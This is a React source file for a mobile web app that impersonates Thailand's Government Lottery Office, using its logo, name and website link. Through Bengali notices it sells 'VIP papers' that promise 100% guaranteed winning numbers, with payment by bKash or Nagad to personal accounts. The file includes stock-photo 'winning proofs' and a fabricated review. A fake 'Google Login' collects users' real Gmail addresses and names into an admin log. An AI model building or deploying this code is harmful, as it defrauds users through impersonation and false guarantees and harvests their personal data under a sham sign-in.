import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, Lock, Unlock, Crown, Sparkles, Copy, CheckCircle, 
  Phone, Globe, Star, ZoomIn, X, Award, Bell, ExternalLink, LogOut
} from 'lucide-react';
import AdminPortal from './AdminPortal';

export default function App() {
  const checkIsAdminRoute = () => {
    const path = window.location.pathname.toLowerCase();
    const hash = window.location.hash.toLowerCase();
    return path === '/admin' || path === '/admin/' || hash === '#admin';
  };

  const [isAdminRoute, setIsAdminRoute] = useState(checkIsAdminRoute);

  useEffect(() => {
    const handleRouteChange = () => {
      setIsAdminRoute(checkIsAdminRoute());
    };
    window.addEventListener('popstate', handleRouteChange);
    window.addEventListener('hashchange', handleRouteChange);
    return () => {
      window.removeEventListener('popstate', handleRouteChange);
      window.removeEventListener('hashchange', handleRouteChange);
    };
  }, []);

  // Force clear old demo cache if version mismatch
  useEffect(() => {
    const version = localStorage.getItem('glo_version');
    if (version !== '3.2.0') {
      localStorage.clear();
      localStorage.setItem('glo_version', '3.2.0');
    }
  }, []);

  // Real-time synchronization via storage event listener
  useEffect(() => {
    const handleStorageSync = (e) => {
      if (e.key && e.key.startsWith('glo_')) {
        setBrandTitle(localStorage.getItem('glo_brandTitle') || 'Thailand Government Lottery');
        setBrandSubtitle(localStorage.getItem('glo_brandSubtitle') || 'สำนักงานสลากกินแบ่งรัฐบาล • Official Portal');
        setLogoUrl(localStorage.getItem('glo_logoUrl') || 'https://www.glo.or.th/assets/img/logo.png');
        setPartnerName(localStorage.getItem('glo_partnerName') || 'Ariyan chaudhari');
        setPartnerRole(localStorage.getItem('glo_partnerRole') || 'Authorized VIP Distributor & Official Analyst');
        setPartnerAvatar(localStorage.getItem('glo_partnerAvatar') || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=300');
        setBkashNumber(localStorage.getItem('glo_bkash') || '01700-000000 (Personal)');
        setNagadNumber(localStorage.getItem('glo_nagad') || '01800-000000 (Personal)');
        setImoNumber(localStorage.getItem('glo_imo') || '+8801700000000');
        setNoticeText(localStorage.getItem('glo_notice') || '⚠️ বিশেষ ঘোষণা: আগামী ১৬ ডিসেম্বর ড্র-এর ১০০% নিশ্চিত ভিআইপি পেপার বুকিং চলছে। বিকাশ বা নগদ সেন্ড মনি করে শেষ ৪ ডিজিট দিয়ে পেপার আনলক করুন।');
        setDrawDateText(localStorage.getItem('glo_drawDate') || '16 December 2026');
        setCountdownTarget(localStorage.getItem('glo_countdown') || '2026-12-16T16:00:00');
        const sPrice = localStorage.getItem('glo_sarPrice');
        if (sPrice) setSarPrice(Number(sPrice));
        const bPrice = localStorage.getItem('glo_bdtPrice');
        if (bPrice) setBdtPrice(Number(bPrice));
        const upImg = localStorage.getItem('glo_upcomingImg');
        if (upImg) setUpcomingPaperImage(upImg);
      }
    };
    window.addEventListener('storage', handleStorageSync);
    return () => window.removeEventListener('storage', handleStorageSync);
  }, []);

  const [brandTitle, setBrandTitle] = useState(() => localStorage.getItem('glo_brandTitle') || 'Thailand Government Lottery');
  const [brandSubtitle, setBrandSubtitle] = useState(() => localStorage.getItem('glo_brandSubtitle') || 'สำนักงานสลากกินแบ่งรัฐบาล • Official Portal');
  const [logoUrl, setLogoUrl] = useState(() => localStorage.getItem('glo_logoUrl') || 'https://www.glo.or.th/assets/img/logo.png');

  const [partnerName, setPartnerName] = useState(() => localStorage.getItem('glo_partnerName') || 'Ariyan chaudhari');
  const [partnerRole, setPartnerRole] = useState(() => localStorage.getItem('glo_partnerRole') || 'Authorized VIP Distributor & Official Analyst');
  const [partnerAvatar, setPartnerAvatar] = useState(() => localStorage.getItem('glo_partnerAvatar') || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=300');

  const [bkashNumber, setBkashNumber] = useState(() => localStorage.getItem('glo_bkash') || '01700-000000 (Personal)');
  const [nagadNumber, setNagadNumber] = useState(() => localStorage.getItem('glo_nagad') || '01800-000000 (Personal)');
  const [imoNumber, setImoNumber] = useState(() => localStorage.getItem('glo_imo') || '+8801700000000');
  const [noticeText, setNoticeText] = useState(() => localStorage.getItem('glo_notice') || '⚠️ বিশেষ ঘোষণা: আগামী ১৬ ডিসেম্বর ড্র-এর ১০০% নিশ্চিত ভিআইপি পেপার বুকিং চলছে। বিকাশ বা নগদ সেন্ড মনি করে শেষ ৪ ডিজিট দিয়ে পেপার আনলক করুন।');
  const [drawDateText, setDrawDateText] = useState(() => localStorage.getItem('glo_drawDate') || '16 December 2026');
  const [countdownTarget, setCountdownTarget] = useState(() => localStorage.getItem('glo_countdown') || '2026-12-16T16:00:00');

  const [sarPrice, setSarPrice] = useState(() => Number(localStorage.getItem('glo_sarPrice')) || 125);
  const [bdtPrice, setBdtPrice] = useState(() => Number(localStorage.getItem('glo_bdtPrice')) || 4000);
  const [upcomingPaperImage, setUpcomingPaperImage] = useState(() => localStorage.getItem('glo_upcomingImg') || 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800');
  const [isUnlocked, setIsUnlocked] = useState(false);

  const [currentUser, setCurrentUser] = useState(null);
  const [isLoginModalOpen, setIsLoginModalOpen] = useState(false);
  const [loginHistory, setLoginHistory] = useState([
    { name: 'Rafiqul Islam', email: 'rafiqul.official@gmail.com', time: '2026-11-20 14:30:12' }
  ]);

  const [isPaymentModalOpen, setIsPaymentModalOpen] = useState(false);
  const [senderLast4, setSenderLast4] = useState('');
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('bkash');
  const [pendingPayments, setPendingPayments] = useState([
    { id: 1, name: 'Rafiqul Islam', email: 'rafiqul.official@gmail.com', last4: '4829', method: 'bKash', amountSar: 125, amountBdt: 4000, time: '2026-11-20 14:35:00', status: 'Pending' }
  ]);

  // Live Purchase Ticker strictly empty by default as requested
  const [liveTickers, setLiveTickers] = useState(() => {
    const saved = localStorage.getItem('glo_liveTickers');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* fallback */ }
    }
    return [];
  });

  const [pastPapers, setPastPapers] = useState(() => {
    const saved = localStorage.getItem('glo_pastPapers');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* fallback */ }
    }
    return [
      { 
        id: 1, 
        date: '16 Nov 2026', 
        image: 'https://images.unsplash.com/photo-1543269865-cbf427effbad?auto=format&fit=crop&q=80&w=800', 
        up3: '654', 
        down: '82', 
        caption: '100% Direct Winning VIP Paper Proof' 
      }
    ];
  });

  const [reviews, setReviews] = useState(() => {
    const saved = localStorage.getItem('glo_reviews');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* fallback */ }
    }
    return [
      { id: 1, name: 'Nazmul Hossain', rating: 5, comment: 'আলহামদুলিল্লাহ, ভিআইপি পেপার নিয়ে প্রথমবারেই সরাসরি ৩UP উইন করেছি।', status: 'Approved' }
    ];
  });

  const [newReviewName, setNewReviewName] = useState('');
  const [newReviewComment, setNewReviewComment] = useState('');

  const [zoomImage, setZoomImage] = useState(null);
  const [timeLeft, setTimeLeft] = useState({ days: 0, hours: 0, minutes: 0, seconds: 0 });

  useEffect(() => {
    try {
      localStorage.setItem('glo_brandTitle', brandTitle);
      localStorage.setItem('glo_brandSubtitle', brandSubtitle);
      localStorage.setItem('glo_logoUrl', logoUrl);
      localStorage.setItem('glo_partnerName', partnerName);
      localStorage.setItem('glo_partnerRole', partnerRole);
      localStorage.setItem('glo_partnerAvatar', partnerAvatar);
      localStorage.setItem('glo_bkash', bkashNumber);
      localStorage.setItem('glo_nagad', nagadNumber);
      localStorage.setItem('glo_imo', imoNumber);
      localStorage.setItem('glo_notice', noticeText);
      localStorage.setItem('glo_drawDate', drawDateText);
      localStorage.setItem('glo_countdown', countdownTarget);
      localStorage.setItem('glo_sarPrice', String(sarPrice));
      localStorage.setItem('glo_bdtPrice', String(bdtPrice));
      localStorage.setItem('glo_upcomingImg', upcomingPaperImage);
      localStorage.setItem('glo_pastPapers', JSON.stringify(pastPapers));
      localStorage.setItem('glo_reviews', JSON.stringify(reviews));
      localStorage.setItem('glo_liveTickers', JSON.stringify(liveTickers));
    } catch (e) {
      console.warn('LocalStorage quota reached');
    }
  }, [
    brandTitle, brandSubtitle, logoUrl, partnerName, partnerRole, partnerAvatar, 
    bkashNumber, nagadNumber, imoNumber, noticeText, drawDateText, 
    countdownTarget, sarPrice, bdtPrice, upcomingPaperImage, pastPapers, reviews, liveTickers
  ]);

  useEffect(() => {
    const timer = setInterval(() => {
      const now = new Date().getTime();
      const target = new Date(countdownTarget).getTime();
      const difference = target - now;

      if (difference > 0) {
        setTimeLeft({
          days: Math.floor(difference / (1000 * 60 * 60 * 24)),
          hours: Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
          minutes: Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60)),
          seconds: Math.floor((difference % (1000 * 60)) / 1000),
        });
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [countdownTarget]);

  if (isAdminRoute) {
    return (
      <AdminPortal
        brandTitle={brandTitle} setBrandTitle={setBrandTitle}
        brandSubtitle={brandSubtitle} setBrandSubtitle={setBrandSubtitle}
        logoUrl={logoUrl} setLogoUrl={setLogoUrl}
        partnerName={partnerName} setPartnerName={setPartnerName}
        partnerRole={partnerRole} setPartnerRole={setPartnerRole}
        partnerAvatar={partnerAvatar} setPartnerAvatar={setPartnerAvatar}
        bkashNumber={bkashNumber} setBkashNumber={setBkashNumber}
        nagadNumber={nagadNumber} setNagadNumber={setNagadNumber}
        imoNumber={imoNumber} setImoNumber={setImoNumber}
        noticeText={noticeText} setNoticeText={setNoticeText}
        drawDateText={drawDateText} setDrawDateText={setDrawDateText}
        countdownTarget={countdownTarget} setCountdownTarget={setCountdownTarget}
        sarPrice={sarPrice} setSarPrice={setSarPrice}
        bdtPrice={bdtPrice} setBdtPrice={setBdtPrice}
        upcomingPaperImage={upcomingPaperImage} setUpcomingPaperImage={setUpcomingPaperImage}
        setIsUnlocked={setIsUnlocked}
        pendingPayments={pendingPayments} setPendingPayments={setPendingPayments}
        pastPapers={pastPapers} setPastPapers={setPastPapers}
        reviews={reviews} setReviews={setReviews}
        loginHistory={loginHistory}
      />
    );
  }

  const handleGoogleLoginReal = () => {
    const realEmail = prompt("আপনার আসল জিমেইল অ্যাকাউন্ট (Real Gmail Address) লিখুন:", "");
    if (!realEmail || !realEmail.includes('@') || !realEmail.toLowerCase().includes('gmail.com')) {
      if (realEmail !== null) alert('দয়া করে আপনার একটি সঠিক জিমেইল অ্যাকাউন্ট দিন।');
      return;
    }
    const realName = prompt("আপনার আসল নাম লিখুন:", realEmail.split('@')[0]);
    const userObj = {
      name: realName || 'Verified User',
      email: realEmail,
      photo: `https://api.dicebear.com/7.x/avataaars/svg?seed=${realEmail}`
    };
    setCurrentUser(userObj);
    setIsLoginModalOpen(false);
    setLoginHistory([{ name: userObj.name, email: userObj.email, time: new Date().toLocaleString() }, ...loginHistory]);
  };

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    alert('কপি করা হয়েছে!');
  };

  const handlePaymentSubmit = (e) => {
    e.preventDefault();
    if (!currentUser) {
      setIsLoginModalOpen(true);
      return;
    }
    if (!senderLast4 || senderLast4.length !== 4) {
      alert('দয়া করে আপনার বিকাশ/নগদ নম্বরটির সঠিক শেষ ৪ ডিজিট (Last 4 Digits) লিখুন।');
      return;
    }

    const newPayment = {
      id: Date.now(),
      name: currentUser.name,
      email: currentUser.email,
      last4: senderLast4,
      method: selectedPaymentMethod.toUpperCase(),
      amountSar: sarPrice,
      amountBdt: bdtPrice,
      time: new Date().toLocaleString(),
      status: 'Pending'
    };
    setPendingPayments([newPayment, ...pendingPayments]);

    const newTicker = {
      id: Date.now(),
      name: currentUser.name,
      amountSar: sarPrice,
      amountBdt: bdtPrice,
      time: new Date().toLocaleTimeString()
    };
    setLiveTickers([newTicker, ...liveTickers]);

    setIsPaymentModalOpen(false);
    setSenderLast4('');
    alert('পেমেন্ট রিকোয়েস্ট সফলভাবে জমা হয়েছে! অ্যাডমিন যাচাই করার পর পেপার আনলক করা হবে।');
  };

  return (
    <div className="min-h-screen bg-[#031410] text-gray-100 font-sans selection:bg-amber-500 selection:text-black flex flex-col items-center">
      
      {/* Mobile App View Wrapper Container */}
      <div className="w-full max-w-md bg-[#031410] min-h-screen shadow-2xl border-x border-amber-500/20 flex flex-col">
        
        {/* Notice Marquee */}
        <div className="bg-gradient-to-r from-amber-600 via-amber-500 to-yellow-600 text-black font-bold text-xs py-1.5 overflow-hidden shadow-md relative z-40">
          <div className="flex whitespace-nowrap animate-marquee items-center">
            <span className="mx-3 flex items-center gap-1.5"><Bell size={14} /> {noticeText}</span>
            <span className="mx-3 flex items-center gap-1.5"><Crown size={14} /> Official GLO VIP Portal</span>
          </div>
        </div>

        {/* Header */}
        <header className="bg-[#041E18]/95 backdrop-blur-md border-b border-amber-500/30 sticky top-0 z-50 px-3 py-2.5 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-10 h-10 rounded-full border-2 border-amber-400 p-0.5 bg-black/40 overflow-hidden shadow-md flex-shrink-0">
              <img src={logoUrl} alt="Logo" className="w-full h-full object-cover rounded-full" />
            </div>
            <div>
              <h1 className="text-sm font-black bg-gradient-to-r from-amber-200 via-amber-400 to-yellow-500 bg-clip-text text-transparent leading-tight">
                {brandTitle}
              </h1>
              <p className="text-[10px] text-amber-300/80 font-medium">{brandSubtitle}</p>
            </div>
          </div>

          <div>
            {currentUser ? (
              <div className="flex items-center gap-1.5 bg-[#062C22] border border-amber-500/40 rounded-full py-1 px-2.5">
                <img src={currentUser.photo} alt="Avatar" className="w-6 h-6 rounded-full border border-amber-400 object-cover" />
                <button onClick={() => setCurrentUser(null)} className="text-[11px] text-red-400 font-bold ml-1">
                  <LogOut size={14} />
                </button>
              </div>
            ) : (
              <button 
                onClick={() => setIsLoginModalOpen(true)}
                className="bg-gradient-to-r from-amber-500 to-yellow-600 text-black font-bold px-3 py-1.5 rounded-full shadow-md text-xs"
              >
                Google Login
              </button>
            )}
          </div>
        </header>

        {/* Main Content Area */}
        <main className="flex-grow px-3 py-4 space-y-6">
          
          {/* Top Banner & Countdown */}
          <section className="bg-gradient-to-br from-[#062C22] to-[#041E18] p-4 rounded-2xl border border-amber-500/30 shadow-xl space-y-4">
            <div className="inline-flex items-center gap-1.5 bg-amber-500/20 border border-amber-500/40 text-amber-300 px-3 py-1 rounded-full text-[10px] font-bold uppercase">
              <Sparkles size={12} /> Official VIP Vault
            </div>
            <h2 className="text-lg font-extrabold text-white leading-snug">
              Next Draw: <span className="text-amber-400">{drawDateText}</span>
            </h2>

            <div className="grid grid-cols-4 gap-2 pt-1">
              {[
                { label: 'Days', val: timeLeft.days },
                { label: 'Hours', val: timeLeft.hours },
                { label: 'Mins', val: timeLeft.minutes },
                { label: 'Secs', val: timeLeft.seconds },
              ].map((item, idx) => (
                <div key={idx} className="bg-black/40 border border-amber-500/40 rounded-xl p-2 text-center">
                  <div className="text-lg font-black text-amber-400 font-mono">{String(item.val).padStart(2, '0')}</div>
                  <div className="text-[9px] text-gray-400 uppercase">{item.label}</div>
                </div>
              ))}
            </div>

            {/* Live Purchase Ticker (Strictly empty if no purchases) */}
            <div className="bg-[#031410] border border-amber-500/30 rounded-xl p-3 text-xs space-y-2">
              <div className="flex items-center gap-1 text-amber-300 font-bold text-[11px]">
                <Crown size={13} /> Live Purchase Ticker
              </div>
              {liveTickers.length === 0 ? (
                <div className="text-center text-gray-400 py-2 text-[11px]">
                  কোনো পারচেস হিস্ট্রি নেই
                </div>
              ) : (
                liveTickers.slice(0, 3).map((t, idx) => (
                  <div key={idx} className="flex items-center justify-between text-[11px] border-b border-gray-800 pb-1">
                    <span className="text-gray-200">👤 {t.name}</span>
                    <span className="text-amber-400 font-bold">{t.amountSar} SAR</span>
                  </div>
                ))
              )}
            </div>
          </section>

          {/* Upcoming VIP Paper Section */}
          <section className="bg-gradient-to-b from-[#062C22] to-[#041E18] border border-amber-500/40 rounded-2xl p-4 shadow-xl space-y-4">
            <div className="text-center space-y-1">
              <span className="text-[10px] uppercase tracking-wider font-extrabold text-amber-400 bg-amber-500/10 px-2.5 py-0.5 rounded-full border border-amber-500/30">
                Exclusive VIP Release
              </span>
              <h3 className="text-base font-black text-white">Upcoming Draw VIP Paper</h3>
            </div>

            <div className="bg-black/60 border border-amber-500/50 rounded-xl p-3 relative overflow-hidden">
              <div className="relative aspect-[3/4] rounded-lg overflow-hidden bg-white/5 flex items-center justify-center">
                <img 
                  src={upcomingPaperImage} 
                  alt="VIP Paper" 
                  className={`w-full h-full object-cover transition-all duration-500 ${isUnlocked ? 'filter-none' : 'blur-xl scale-105 opacity-40'}`}
                />

                {!isUnlocked && (
                  <div className="absolute inset-0 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center p-4 text-center space-y-4">
                    <div className="w-14 h-14 rounded-full bg-amber-500/20 border-2 border-amber-400 flex items-center justify-center text-amber-400 animate-pulse">
                      <Lock size={28} />
                    </div>
                    <div>
                      <h4 className="text-sm font-bold text-amber-200">VIP Paper is Locked</h4>
                      <p className="text-[10px] text-gray-300">Unlock direct 3UP & DOWN numbers.</p>
                    </div>

                    <div className="bg-gradient-to-r from-amber-600 to-yellow-600 text-black font-extrabold px-4 py-2 rounded-xl text-xs">
                      {sarPrice} SAR | ৳ {bdtPrice.toLocaleString()} BDT
                    </div>

                    <button 
                      onClick={() => {
                        if (!currentUser) setIsLoginModalOpen(true);
                        else setIsPaymentModalOpen(true);
                      }}
                      className="w-full bg-gradient-to-r from-amber-400 via-amber-500 to-yellow-500 text-black font-extrabold py-2.5 rounded-xl text-xs shadow-lg flex items-center justify-center gap-1.5"
                    >
                      <Unlock size={16} /> Unlock Paper Now
                    </button>
                  </div>
                )}

                {isUnlocked && (
                  <div className="absolute top-2 left-2 bg-emerald-600 text-white font-bold text-[10px] px-3 py-1 rounded-full flex items-center gap-1">
                    <CheckCircle size={12} /> Unlocked
                  </div>
                )}
              </div>
            </div>
          </section>

          {/* Past Win Proofs */}
          <section className="space-y-4">
            <div className="text-center space-y-1">
              <h3 className="text-base font-black text-white">বিগত ড্র-গুলোর সফলতার প্রমাণ</h3>
            </div>

            <div className="space-y-3">
              {pastPapers.map((paper) => (
                <div key={paper.id} className="bg-[#062C22] border border-amber-500/30 rounded-2xl p-3 flex items-center gap-3 shadow-md">
                  <img src={paper.image} alt="" className="w-16 h-20 object-cover rounded-xl border border-amber-400/50 flex-shrink-0" />
                  <div className="space-y-1 flex-grow">
                    <span className="text-[10px] text-amber-400 font-bold">{paper.date}</span>
                    <p className="text-xs text-gray-200 font-medium">{paper.caption}</p>
                    <div className="text-[11px] text-amber-300 font-mono">
                      3UP: <strong>{paper.up3}</strong> | DOWN: <strong>{paper.down}</strong>
                    </div>
                  </div>
                  <button onClick={() => setZoomImage(paper)} className="bg-black/40 text-amber-300 p-2 rounded-xl border border-amber-500/30">
                    <ZoomIn size={16} />
                  </button>
                </div>
              ))}
            </div>
          </section>

          {/* Contact & Helpline */}
          <section className="grid grid-cols-2 gap-3">
            <a href="https://www.glo.or.th" target="_blank" rel="noreferrer" className="bg-[#062C22] border border-amber-500/30 rounded-2xl p-3 text-center space-y-1">
              <Globe size={20} className="text-amber-400 mx-auto" />
              <div className="text-xs font-bold text-white">Official GLO</div>
              <div className="text-[10px] text-amber-300">www.glo.or.th</div>
            </a>
            <div className="bg-[#062C22] border border-amber-500/30 rounded-2xl p-3 text-center space-y-1">
              <Phone size={20} className="text-amber-400 mx-auto" />
              <div className="text-xs font-bold text-white">Imo Helpline</div>
              <div className="text-[10px] font-mono text-amber-300">{imoNumber}</div>
            </div>
          </section>
        </main>

        {/* Footer */}
        <footer className="bg-[#020C0A] border-t border-amber-500/30 p-4 space-y-3 text-center text-xs text-gray-400">
          <div className="flex items-center justify-center gap-3 bg-[#062C22] border border-amber-500/40 rounded-2xl p-3">
            <img src={partnerAvatar} alt="" className="w-12 h-12 rounded-full border border-amber-400 object-cover" />
            <div className="text-left">
              <p className="text-xs font-extrabold text-white">{partnerName}</p>
              <p className="text-[10px] text-amber-300">{partnerRole}</p>
            </div>
          </div>
          <p className="text-[10px]">&copy; 2026 Thailand Government Lottery. All Rights Reserved.</p>
        </footer>

      </div>

      {/* Login Modal */}
      {isLoginModalOpen && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-[#062C22] border border-amber-500/50 rounded-3xl p-6 max-w-sm w-full space-y-4 relative">
            <button onClick={() => setIsLoginModalOpen(false)} className="absolute top-3 right-3 text-gray-400 hover:text-white"><X size={18} /></button>
            <h3 className="text-lg font-bold text-white text-center">Sign in with Real Gmail</h3>
            <button onClick={handleGoogleLoginReal} className="w-full bg-white text-black font-bold py-3 rounded-xl text-xs flex items-center justify-center gap-2">
              Continue with Google Account
            </button>
          </div>
        </div>
      )}

      {/* Payment Modal */}
      {isPaymentModalOpen && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-[#062C22] border border-amber-500/50 rounded-3xl p-6 max-w-sm w-full space-y-4 relative">
            <button onClick={() => setIsPaymentModalOpen(false)} className="absolute top-3 right-3 text-gray-400 hover:text-white"><X size={18} /></button>
            <h3 className="text-lg font-bold text-white text-center">VIP Paper Payment</h3>
            <div className="bg-black/40 p-3 rounded-xl text-center text-amber-400 font-bold">
              {sarPrice} SAR | ৳ {bdtPrice.toLocaleString()} BDT
            </div>
            <div className="grid grid-cols-2 gap-2">
              <button onClick={() => setSelectedPaymentMethod('bkash')} className={`py-2 rounded-xl text-xs font-bold ${selectedPaymentMethod === 'bkash' ? 'bg-pink-600 text-white' : 'bg-black/40 text-gray-300'}`}>bKash</button>
              <button onClick={() => setSelectedPaymentMethod('nagad')} className={`py-2 rounded-xl text-xs font-bold ${selectedPaymentMethod === 'nagad' ? 'bg-orange-600 text-white' : 'bg-black/40 text-gray-300'}`}>Nagad</button>
            </div>
            <div className="bg-black/50 p-3 rounded-xl flex items-center justify-between text-xs">
              <span className="font-mono text-amber-300">{selectedPaymentMethod === 'bkash' ? bkashNumber : nagadNumber}</span>
              <button onClick={() => handleCopy(selectedPaymentMethod === 'bkash' ? bkashNumber : nagadNumber)} className="bg-amber-500 text-black px-2.5 py-1 rounded-lg font-bold">Copy</button>
            </div>
            <form onSubmit={handlePaymentSubmit} className="space-y-3">
              <input 
                type="text" 
                maxLength="4" 
                placeholder="বিকাশ/নগদের শেষ ৪ ডিজিট" 
                value={senderLast4} 
                onChange={e => setSenderLast4(e.target.value)} 
                className="w-full bg-black/40 border border-amber-500/40 rounded-xl px-4 py-3 text-center text-base font-mono text-white"
                required
              />
              <button type="submit" className="w-full bg-amber-500 text-black font-extrabold py-3 rounded-xl text-xs">Confirm Payment</button>
            </form>
          </div>
        </div>
      )}

      {/* Zoom Modal */}
      {zoomImage && (
        <div className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4">
          <button onClick={() => setZoomImage(null)} className="absolute top-4 right-4 bg-black/60 text-white p-2 rounded-full"><X size={20} /></button>
          <div className="max-w-md w-full bg-[#062C22] border border-amber-500/50 rounded-2xl p-3 space-y-3">
            <img src={zoomImage.image} alt="" className="w-full rounded-xl" />
            <div className="text-center text-xs text-amber-300">
              3UP: <strong>{zoomImage.up3}</strong> | DOWN: <strong>{zoomImage.down}</strong>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
